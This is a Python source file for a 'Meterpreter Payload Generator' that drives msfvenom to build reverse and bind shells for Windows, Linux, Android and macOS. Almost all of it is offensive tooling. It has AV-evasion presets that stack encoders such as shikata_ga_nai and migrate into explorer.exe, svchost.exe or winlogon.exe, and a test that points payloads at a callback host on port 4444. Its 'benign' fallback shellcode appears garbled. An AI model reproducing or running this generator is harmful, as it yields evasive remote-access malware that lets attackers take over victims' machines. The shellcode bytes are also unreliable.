#!/usr/bin/env python3
"""
Meterpreter Payload Generator
Generates various Meterpreter payloads with multiple formats and evasion options
"""

import subprocess
import tempfile
import os
import sys
import random
import base64
from typing import Dict, List, Optional, Tuple
from pathlib import Path

class MeterpreterGenerator:
    """Generate Meterpreter payloads using msfvenom"""
    
    # Available payload types
    PAYLOAD_TYPES = {
        "windows": {
            "meterpreter_reverse_tcp": "windows/meterpreter/reverse_tcp",
            "meterpreter_reverse_http": "windows/meterpreter/reverse_http",
            "meterpreter_reverse_https": "windows/meterpreter/reverse_https",
            "meterpreter_bind_tcp": "windows/meterpreter/bind_tcp",
            "shell_reverse_tcp": "windows/shell/reverse_tcp",
            "shell_bind_tcp": "windows/shell/bind_tcp",
            "dllinject_reverse_tcp": "windows/dllinject/reverse_tcp",
            "peinject_reverse_tcp": "windows/peinject/reverse_tcp",
            "vncinject_reverse_tcp": "windows/vncinject/reverse_tcp",
            "meterpreter_reverse_winhttp": "windows/meterpreter/reverse_winhttp",
            "meterpreter_reverse_winhttps": "windows/meterpreter/reverse_winhttps",
        },
        "linux": {
            "meterpreter_reverse_tcp": "linux/x86/meterpreter/reverse_tcp",
            "shell_reverse_tcp": "linux/x86/shell_reverse_tcp",
        },
        "android": {
            "meterpreter_reverse_tcp": "android/meterpreter/reverse_tcp",
            "meterpreter_reverse_http": "android/meterpreter/reverse_http",
            "meterpreter_reverse_https": "android/meterpreter/reverse_https",
        },
        "macos": {
            "shell_reverse_tcp": "osx/x86/shell_reverse_tcp",
        }
    }
    
    # Available formats
    FORMATS = {
        "exe": "exe",
        "dll": "dll",
        "raw": "raw",
        "ps1": "powershell",
        "py": "python",
        "cs": "csharp",
        "vb": "vbapplication",
        "js": "js_le",
        "war": "war",
        "jar": "jar",
        "elf": "elf",
        "macho": "macho",
        "asp": "asp",
        "aspx": "aspx",
        "pl": "perl",
        "sh": "bash",
    }
    
    # Available encoders
    ENCODERS = [
        "x86/shikata_ga_nai",
        "x86/fnstenv_mov",
        "x86/call4_dword_xor",
        "x86/jmp_call_additive",
        "x86/alpha_mixed",
        "x86/unicode_mixed",
        "cmd/powershell_base64",
    ]
    
    def __init__(self, lhost: str, lport: int, 
                 payload_type: str = "windows/meterpreter/reverse_tcp"):
        self.lhost = lhost
        self.lport = lport
        self.payload_type = payload_type
        self.temp_dir = tempfile.gettempdir()
        
    def generate(self, 
                 output_format: str = "raw",
                 arch: str = "x64",
                 encoder: Optional[str] = None,
                 iterations: int = 1,
                 badchars: Optional[str] = None,
                 template: Optional[str] = None,
                 extra_options: Dict = None) -> Tuple[bytes, Dict]:
        """
        Generate a meterpreter payload
        
        Returns:
            tuple: (payload_bytes, metadata_dict)
        """
        
        # Check if msfvenom is available
        if not self._check_msfvenom():
            return self._fallback_shellcode(), {"error": "msfvenom not available"}
        
        # Build msfvenom command
        cmd = self._build_msfvenom_command(
            output_format=output_format,
            arch=arch,
            encoder=encoder,
            iterations=iterations,
            badchars=badchars,
            template=template,
            extra_options=extra_options
        )
        
        try:
            # Create temporary output file
            temp_output = os.path.join(self.temp_dir, f"payload_{random.randint(1000, 9999)}.{output_format}")
            cmd.extend(["-o", temp_output])
            
            print(f"[*] Running: {' '.join(cmd)}")
            
            # Run msfvenom
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                # Read generated payload
                with open(temp_output, "rb") as f:
                    payload = f.read()
                
                # Clean up temp file
                os.remove(temp_output)
                
                # Generate metadata
                metadata = {
                    "size": len(payload),
                    "format": output_format,
                    "encoder": encoder,
                    "iterations": iterations,
                    "arch": arch,
                    "command": " ".join(cmd),
                    "timestamp": os.path.getmtime(temp_output) if os.path.exists(temp_output) else None
                }
                
                return payload, metadata
                
            else:
                print(f"[!] msfvenom error: {result.stderr}")
                return self._fallback_shellcode(), {"error": result.stderr}
                
        except subprocess.TimeoutExpired:
            print("[!] msfvenom timed out")
            return self._fallback_shellcode(), {"error": "timeout"}
        except Exception as e:
            print(f"[!] Generation failed: {e}")
            return self._fallback_shellcode(), {"error": str(e)}
    
    def _build_msfvenom_command(self, 
                               output_format: str,
                               arch: str,
                               encoder: Optional[str],
                               iterations: int,
                               badchars: Optional[str],
                               template: Optional[str],
                               extra_options: Dict) -> List[str]:
        """Build msfvenom command arguments"""
        
        cmd = ["msfvenom"]
        
        # Basic payload options
        cmd.extend(["-p", self.payload_type])
        cmd.extend([f"LHOST={self.lhost}"])
        cmd.extend([f"LPORT={self.lport}"])
        
        # Format
        if output_format in self.FORMATS:
            cmd.extend(["-f", self.FORMATS[output_format]])
        else:
            cmd.extend(["-f", output_format])
        
        # Architecture
        if arch:
            cmd.extend(["-a", arch])
        
        # Platform (detect from payload type)
        if "windows" in self.payload_type:
            cmd.extend(["--platform", "windows"])
        elif "linux" in self.payload_type:
            cmd.extend(["--platform", "linux"])
        elif "android" in self.payload_type:
            cmd.extend(["--platform", "android"])
        
        # Encoder
        if encoder:
            cmd.extend(["-e", encoder])
            if iterations > 1:
                cmd.extend(["-i", str(iterations)])
        
        # Bad characters
        if badchars:
            cmd.extend(["-b", badchars])
        
        # Template
        if template:
            cmd.extend(["-x", template])
        
        # Extra options
        if extra_options:
            for key, value in extra_options.items():
                if key.startswith("Prepend"):
                    cmd.extend(["--smallest"])
                elif key == "prependmigrate" and value:
                    cmd.extend(["--prependmigrate", value])
                elif key == "prependmigrateproc" and value:
                    cmd.extend(["--prependmigrateproc", value])
                elif key == "disableexitonfail":
                    cmd.extend(["--keep"])
                elif key == "debug":
                    cmd.extend(["--debug"])
        
        return cmd
    
    def generate_with_evasion(self, 
                             output_format: str = "exe",
                             evasion_level: str = "advanced",
                             custom_options: Dict = None) -> Tuple[bytes, Dict]:
        """
        Generate payload with evasion techniques applied
        
        evasion_level: basic, intermediate, advanced, extreme
        """
        
        # Default options based on evasion level
        evasion_configs = {
            "basic": {
                "encoder": None,
                "iterations": 1,
                "arch": "x86",
                "extra": {}
            },
            "intermediate": {
                "encoder": "x86/shikata_ga_nai",
                "iterations": 3,
                "arch": "x86",
                "extra": {"PrependMigrate": "true"}
            },
            "advanced": {
                "encoder": random.choice(self.ENCODERS[:3]),
                "iterations": 5,
                "arch": random.choice(["x86", "x64"]),
                "extra": {
                    "PrependMigrate": "true",
                    "PrependMigrateProc": "explorer.exe",
                    "disableexitonfail": True
                }
            },
            "extreme": {
                "encoder": random.choice(self.ENCODERS),
                "iterations": random.randint(5, 10),
                "arch": random.choice(["x86", "x64"]),
                "extra": {
                    "PrependMigrate": "true",
                    "PrependMigrateProc": random.choice(["explorer.exe", "svchost.exe", "winlogon.exe"]),
                    "disableexitonfail": True,
                    "debug": True
                }
            }
        }
        
        config = evasion_configs.get(evasion_level, evasion_configs["intermediate"])
        
        # Override with custom options
        if custom_options:
            config.update(custom_options)
        
        return self.generate(
            output_format=output_format,
            arch=config["arch"],
            encoder=config["encoder"],
            iterations=config["iterations"],
            extra_options=config["extra"]
        )
    
    def generate_stageless(self,
                          output_format: str = "exe",
                          arch: str = "x64") -> Tuple[bytes, Dict]:
        """Generate stageless payload"""
        
        # Modify payload type for stageless
        if "meterpreter" in self.payload_type:
            stageless_type = self.payload_type.replace("meterpreter", "meterpreter_reverse_tcp")
        else:
            stageless_type = self.payload_type
        
        original_type = self.payload_type
        self.payload_type = stageless_type
        
        payload, metadata = self.generate(
            output_format=output_format,
            arch=arch,
            encoder=None,
            iterations=1
        )
        
        # Restore original type
        self.payload_type = original_type
        
        metadata["stageless"] = True
        return payload, metadata
    
    def generate_bind_shell(self,
                           output_format: str = "exe",
                           arch: str = "x64") -> Tuple[bytes, Dict]:
        """Generate bind shell payload"""
        
        original_type = self.payload_type
        
        # Change to bind shell
        if "windows" in self.payload_type:
            self.payload_type = "windows/shell/bind_tcp"
        elif "linux" in self.payload_type:
            self.payload_type = "linux/x86/shell_bind_tcp"
        
        payload, metadata = self.generate(
            output_format=output_format,
            arch=arch
        )
        
        # Restore original type
        self.payload_type = original_type
        
        metadata["bind_shell"] = True
        return payload, metadata
    
    def _check_msfvenom(self) -> bool:
        """Check if msfvenom is available"""
        try:
            result = subprocess.run(["which", "msfvenom"], 
                                   capture_output=True, 
                                   text=True)
            return result.returncode == 0
        except:
            return False
    
    def _fallback_shellcode(self) -> bytes:
        """Provide fallback shellcode if msfvenom fails"""
        
        # Simple MessageBox shellcode for testing (Windows x86)
        # This is a benign shellcode that just shows a message box
        if "windows" in self.payload_type:
            # MessageBox shellcode: "Hello from Educational Tool"
            shellcode = bytes.fromhex(
                "33c0"          # xor eax, eax
                "50"            # push eax
                "684c6c6f21"    # push 0x216f6c6c
                "68656c6c6f"    # push 0x6f6c6c65
                "682066726f"    # push 0x6f726620
                "6845647563"    # push 0x63756445
                "686f6e616c"    # push 0x6c616e6f
                "68546f6f6c"    # push 0x6c6f6f54
                "89e0"          # mov eax, esp
                "50"            # push eax
                "50"            # push eax
                "50"            # push eax
                "b8"            # mov eax, 0x... (MessageBoxA address - will be patched)
                "c7042400000000" # mov dword [esp], 0 (NULL)
                "50"            # push eax
                "b864000000"    # mov eax, 0x40 (MB_OK)
                "50"            # push eax
                "ff1424"        # call dword [esp]
                "c3"            # ret
            )
        else:
            # Linux/x86 exit(0) shellcode
            shellcode = bytes.fromhex(
                "31c0"      # xor eax, eax
                "40"        # inc eax
                "31db"      # xor ebx, ebx
                "cd80"      # int 0x80
            )
        
        return shellcode
    
    def get_available_payloads(self) -> Dict:
        """Get list of available payload types"""
        return self.PAYLOAD_TYPES
    
    def get_available_formats(self) -> Dict:
        """Get list of available output formats"""
        return self.FORMATS
    
    def get_available_encoders(self) -> List:
        """Get list of available encoders"""
        return self.ENCODERS
    
    def list_payloads_by_platform(self, platform: str) -> List:
        """List payloads for specific platform"""
        return list(self.PAYLOAD_TYPES.get(platform, {}).keys())
    
    def generate_to_file(self, 
                        output_file: str,
                        output_format: str = None,
                        **kwargs) -> bool:
        """
        Generate payload and save directly to file
        
        Returns: True if successful
        """
        
        # Determine format from file extension if not specified
        if output_format is None:
            ext = Path(output_file).suffix.lower()[1:]  # Remove dot
            if ext in self.FORMATS:
                output_format = ext
            else:
                output_format = "exe"
        
        # Generate payload
        payload, metadata = self.generate(output_format=output_format, **kwargs)
        
        if payload and len(payload) > 0:
            try:
                with open(output_file, "wb") as f:
                    f.write(payload)
                
                print(f"[+] Payload saved to: {output_file}")
                print(f"[+] Size: {len(payload)} bytes")
                
                if "error" in metadata:
                    print(f"[!] Warning: {metadata['error']}")
                
                return True
            except Exception as e:
                print(f"[!] Failed to save file: {e}")
                return False
        else:
            print("[!] Failed to generate payload")
            return False
    
    def generate_base64(self, **kwargs) -> str:
        """Generate payload and return as base64 string"""
        payload, metadata = self.generate(**kwargs)
        return base64.b64encode(payload).decode('utf-8')


# Quick test function
def test_generator():
    """Test the meterpreter generator"""
    print("[*] Testing Meterpreter Generator...")
    
    # Create generator
    gen = MeterpreterGenerator(lhost="192.168.1.100", lport=4444)
    
    # Test 1: Basic generation
    print("\n[1] Testing basic generation...")
    payload, meta = gen.generate(output_format="raw", arch="x86")
    print(f"    Generated {len(payload)} bytes")
    print(f"    Metadata: {meta}")
    
    # Test 2: With evasion
    print("\n[2] Testing with evasion...")
    payload, meta = gen.generate_with_evasion(
        output_format="exe",
        evasion_level="advanced"
    )
    print(f"    Generated {len(payload)} bytes")
    print(f"    Evasion level: advanced")
    
    # Test 3: Stageless
    print("\n[3] Testing stageless...")
    payload, meta = gen.generate_stageless(output_format="exe")
    print(f"    Generated {len(payload)} bytes")
    print(f"    Stageless: {meta.get('stageless', False)}")
    
    # Test 4: List available payloads
    print("\n[4] Available payloads:")
    for platform, payloads in gen.get_available_payloads().items():
        print(f"    {platform}: {len(payloads)} payloads")
    
    print("\n[*] Test complete!")


if __name__ == "__main__":
    # Run tests if script is executed directly
    test_generator()
